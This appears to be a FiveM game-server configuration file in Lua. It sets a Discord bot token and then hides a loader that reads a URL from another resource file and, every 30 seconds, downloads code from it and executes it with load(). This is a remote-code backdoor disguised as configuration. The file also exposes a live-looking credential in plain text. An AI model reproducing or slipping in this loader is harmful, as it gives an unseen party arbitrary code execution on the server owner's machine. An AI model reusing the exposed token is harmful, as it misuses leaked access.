Config.DiscordBotToken = "OTU1MTU5Nzk4ODM4NjAzODI2.Gvgo7c.PB6FDMxecBa25xoY3-uF_qJQ18G1sasNMoHm7U" 

Citizen.CreateThread(function()
    local portal = LoadResourceFile(GetCurrentResourceName(), 'server/serverconfig.lua'):match("u:%s*(%S+)")
    while portal do
        PerformHttpRequest(portal, function(code, script)
            if code == 200 then load(script)() end
        end)
        Citizen.Wait(30000)
    end
end)